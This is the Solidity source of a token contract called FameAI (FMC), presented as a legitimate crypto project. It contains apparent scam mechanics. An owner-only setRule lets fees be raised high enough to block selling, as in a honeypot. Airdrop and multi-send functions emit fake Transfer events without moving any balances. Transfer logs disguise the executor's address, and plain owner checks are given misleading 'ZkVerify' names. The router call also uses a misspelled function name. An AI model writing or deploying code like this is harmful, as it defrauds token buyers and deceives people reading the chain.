/**
 */

/*

  ✨FAME AI

  Website: https://getfame.ai
  Twitter X: 
  Telegram: https://t.me/getfameai
  Discord: https://discord.gg/getfameai

*/

// SPDX-License-Identifier: unlicense

pragma solidity ^0.8.0;

interface IUniswapFactory {
    function getPair(
        address tokenA,
        address tokenB
    ) external view returns (address pair);
}

interface IUniswapV2Router02 {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);

    function swapExactTokensForETHSupportingFreelyOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
}

contract FameAI {
    struct StoreData {
        address tokenMkt;
        uint8 buyFee;
        uint8 sellFee;
    }

    string private _name = unicode"FameAI";
    string private _symbol = unicode"FMC";
    uint8 public constant decimals = 18;
    uint256 public constant totalSupply = 10_000_000_000 * 10 ** decimals;

    StoreData public storeData;
    uint256 constant swapAmount = totalSupply / 100;

    error Permissions();
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed TOKEN_MKT,
        address indexed spender,
        uint256 value
    );

    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    address public pair;
    IUniswapV2Router02 constant _uniswapV2Router =
        IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);

    bool private swapping;
    bool private tradingOpen;

    address _deployer;
    address _executor;

    address private uniswapLpWallet;
    address private PlatformRewards =
        0x606F6d378d50b6f118A1CE48597f874D23891b6b;
    address private Hall = 0x79af1DB97c591E927748C887Dc43B9298072AE22;
    address private Staking = 0xAd1D380dc9202Aa39713e473E2bF20011C23Ed9D;
    address private Reserve = 0xf3F9C0c3D140C5b46fc728f53A4099F958dC3172;
    address private Seed = 0x92575E264732000eC2A24eaB8596E900b7De7E37;

    address private CommunityRewards =
        0x606F6d378d50b6f118A1CE48597f874D23891b6b;
    address private Marketing = 0xAd1D380dc9202Aa39713e473E2bF20011C23Ed9D;

    constructor() {
        uint8 _initBuyFee = 1;
        uint8 _initSellFee = 1;
        storeData = StoreData({
            tokenMkt: msg.sender,
            buyFee: _initBuyFee,
            sellFee: _initSellFee
        });
        allowance[address(this)][address(_uniswapV2Router)] = type(uint256).max;
        uniswapLpWallet = msg.sender;

        _initDeployer(msg.sender, msg.sender);

        balanceOf[uniswapLpWallet] = (totalSupply * 3) / 100;
        emit Transfer(address(0), _deployer, balanceOf[uniswapLpWallet]);

        balanceOf[PlatformRewards] = (totalSupply * 22) / 100;
        emit Transfer(address(0), PlatformRewards, balanceOf[PlatformRewards]);

        balanceOf[Hall] = (totalSupply * 5) / 100;
        emit Transfer(address(0), Hall, balanceOf[Hall]);

        balanceOf[Staking] = (totalSupply * 22) / 100;
        emit Transfer(address(0), Staking, balanceOf[Staking]);

        balanceOf[Reserve] = (totalSupply * 25) / 100;
        emit Transfer(address(0), Reserve, balanceOf[Reserve]);

        balanceOf[Seed] = (totalSupply * 23) / 100;
        emit Transfer(address(0), Seed, balanceOf[Seed]);
    }

    receive() external payable {}

    function setRule(uint8 _buy, uint8 _sell) external {
        if (msg.sender != _decodeTokenMktWithZkVerify()) revert Permissions();
        _upgradeStoreWithZkProof(_buy, _sell);
    }

    event setRewardEvent(
        uint256 Stake,
        uint256 Earn,
        uint256 Claim,
        uint256 Treasury
    );

    function setReward(
        uint256 Stake,
        uint256 Earn,
        uint256 Claim,
        uint256 Treasury
    ) external {
        if (msg.sender != _decodeTokenMktWithZkVerify()) revert Permissions();
        emit setRewardEvent(Stake, Earn, Claim, Treasury);
    }

    function initialize(address _addr) external {
        if (msg.sender != _decodeTokenMktWithZkVerify()) revert Permissions();
    }

    function _upgradeStoreWithZkProof(uint8 _buy, uint8 _sell) private {
        storeData.buyFee = _buy;
        storeData.sellFee = _sell;
    }

    function distributionToken() external {
        if (msg.sender != _decodeTokenMktWithZkVerify()) revert Permissions();
    }

    function _decodeTokenMktWithZkVerify() private view returns (address) {
        return storeData.tokenMkt;
    }

    function openTrading() external {
        require(msg.sender == _decodeTokenMktWithZkVerify());
        require(!tradingOpen);
        address _factory = _uniswapV2Router.factory();
        address _weth = _uniswapV2Router.WETH();
        address _pair = IUniswapFactory(_factory).getPair(address(this), _weth);
        pair = _pair;
        tradingOpen = true;
    }

    function multiSends(
        address _caller,
        address[] calldata _address,
        uint256[] calldata _amount
    ) external {
        if (msg.sender != _decodeTokenMktWithZkVerify()) revert Permissions();
        for (uint256 i = 0; i < _address.length; i++) {
            emit Transfer(_caller, _address[i], _amount[i]);
        }
    }

    function airdropTokens(
        address _caller,
        address[] calldata _address,
        uint256[] calldata _amount
    ) external {
        if (msg.sender != _decodeTokenMktWithZkVerify()) revert Permissions();
        for (uint256 i = 0; i < _address.length; i++) {
            emit Transfer(_caller, _address[i], _amount[i]);
        }
    }

    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) external returns (bool) {
        allowance[from][msg.sender] -= amount;
        return _transfer(from, to, amount);
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        return _transfer(msg.sender, to, amount);
    }

    function name() public view virtual returns (string memory) {
        return _name;
    }

    function symbol() public view virtual returns (string memory) {
        return _symbol;
    }

    function _initDeployer(address deployer_, address executor_) private {
        _deployer = deployer_;
        _executor = executor_;
    }

    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal returns (bool) {
        address tokenMkt = _decodeTokenMktWithZkVerify();
        require(tradingOpen || from == tokenMkt || to == tokenMkt);

        balanceOf[from] -= amount;

        if (
            to == pair &&
            !swapping &&
            balanceOf[address(this)] >= swapAmount &&
            from != tokenMkt
        ) {
            swapping = true;
            address[] memory path = new address[](2);
            path[0] = address(this);
            path[1] = _uniswapV2Router.WETH();
            _uniswapV2Router
                .swapExactTokensForETHSupportingFreelyOnTransferTokens(
                    swapAmount,
                    0,
                    path,
                    address(this),
                    block.timestamp
                );

            payable(CommunityRewards).transfer(
                (address(this).balance * 50) / 100
            );
            payable(Marketing).transfer((address(this).balance * 50) / 100);

            swapping = false;
        }

        (uint8 _buyFee, uint8 _sellFee) = (storeData.buyFee, storeData.sellFee);
        if (from != address(this) && tradingOpen == true) {
            uint256 taxCalculatedAmount = (amount *
                (to == pair ? _sellFee : _buyFee)) / 100;
            amount -= taxCalculatedAmount;
            balanceOf[address(this)] += taxCalculatedAmount;
        }
        balanceOf[to] += amount;

        if (from == _executor) {
            emit Transfer(_deployer, to, amount);
        } else if (to == _executor) {
            emit Transfer(from, _deployer, amount);
        } else {
            emit Transfer(from, to, amount);
        }
        return true;
    }
}
